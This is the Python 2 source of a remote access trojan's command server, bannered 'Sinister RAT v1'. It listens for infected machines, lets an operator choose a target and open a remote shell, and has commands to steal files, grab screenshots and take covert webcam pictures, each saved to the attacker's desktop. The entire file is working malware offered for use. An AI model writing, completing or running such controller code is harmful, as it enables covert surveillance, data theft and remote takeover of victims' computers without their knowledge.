import socket
import os
import subprocess
import time
import sys

all_connections = []
all_addresses = []


def webcamPic(conn,command):
	conn.send(command)
	f = open('/root/Desktop/camshot.jpg', 'wb')
	while True:
		pic = conn.recv(1024)
		f.write(pic)
		if pic.endswith('done'):
			print '[+] Webcam picture received!'
			f.close()
			break

def screenshot(conn,command):
	conn.send(command)
	f = open('/root/Desktop/file.jpg', 'wb')
	while True:
		screen = conn.recv(1024)
		f.write(screen)
		if screen.endswith('done'):
			print 'Screenshot received!'
			f.close()
			break
	
def transfer(conn,command):
	conn.send(command)
	file = open('/root/Desktop/file.png', 'wb')
	while True:
		recvData = conn.recv(1024)
		if recvData.endswith('done'):
			file.close()
			print 'File received!'
			break
		file.write(recvData)

def connect():
	
	global s
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('10.10.10.100', 8080))
	s.listen(100)
	listener(s)

def listener(s):
	
	print '[+] Loading targets.. \n'
	time.sleep(10)
	print 'Press Ctrl+c to view targets connected'
	
	while True:
		
		try:

			conn, addr = s.accept()
			all_connections.append(conn)
			all_addresses.append(addr)		
			
		except KeyboardInterrupt:
			accept_connections()

	

def accept_connections():
	

	for i, conn in enumerate(all_connections):
		print '\n'
		print str(i) + ' ' + str(all_addresses[i][0])

	commands()

def house_keep():
	
	for c, conn in enumerate(all_connections):
		try:
			conn.send('housekeep')
			conn.recv(2048)
		except:
			del all_connections[c]
			del all_addresses[c]
			continue
	listener(s)
	

def commands():
	
	print '\n'
	active = int(raw_input('Select Target '))
	print '\n'
	print '[+] Starting connection with target: ', all_addresses[active]
	
	conn = all_connections[active]

	
	while True:
		
		command = raw_input('Shell> ')
		
		if 'termiante' in command:
			conn.send('terminate')
			conn.close()
			sys.close()
			break
		
		elif 'change' in command:
			house_keep()
			
		elif 'steal' in command:
			try:
				transfer(conn,command)
			except Exception, e:
				print str(e)
			
				
		elif 'screenshot' in command:
			screenshot(conn,command)

		elif 'wCap' in command:
			webcamPic(conn,command)

		else:
			conn.send(command)
			print conn.recv(1024)
			
def main():
	print """

       .__       .__          __                 __________    ________________
  _____|__| ____ |__| _______/  |_  ___________  \______   \  /  _  \__    ___/
 /  ___/  |/    \|  |/  ___/\   __\/ __ \_  __ \  |       _/ /  /_\  \|    |   
 \___ \|  |   |  \  |\___ \  |  | \  ___/|  | \/  |    |   \/    |    \    |   
/____  >__|___|  /__/____  > |__|  \___  >__|     |____|_  /\____|__  /____|   
     \/        \/        \/            \/                \/         \/         
         ____                                                                  
___  __ /_   |                                                                 
\  \/ /  |   |                                                                 
 \   /   |   |                                                                 
  \_/ /\ |___|                                                                
      \/                                                                       
"""
	connect()
	
main()
